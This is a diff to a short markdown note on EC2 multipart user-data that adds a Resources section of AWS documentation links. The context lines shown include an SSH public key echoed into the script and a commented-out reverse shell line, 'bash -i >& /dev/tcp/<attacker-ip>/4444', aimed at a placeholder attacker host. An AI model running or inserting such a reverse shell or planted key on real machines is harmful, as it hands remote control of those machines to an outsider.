@@ -1,6 +1,6 @@
 # user-data
 
-**Author:** Julien Bongars  
+**Author:** Julien Bongars\
 **Date:** 2025-12-22 21:38:26
 **Path:**
 
@@ -46,3 +46,9 @@ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM0M0hjLvNVV8KKu4Ko6bZbnafwgcf7vmM/GQe
 # bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
 --//--
 ```
+
+## Resources
+
+- [AWS Systems Manager Agent — RHEL 8/9](https://docs.aws.amazon.com/systems-manager/latest/userguide/agent-install-rhel-8-9.html) — SSM install cited in the script
+- [amazon-ssm-agent.rpm](https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm) — package URL in the script
+- [EC2 user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html) — multipart userdata format
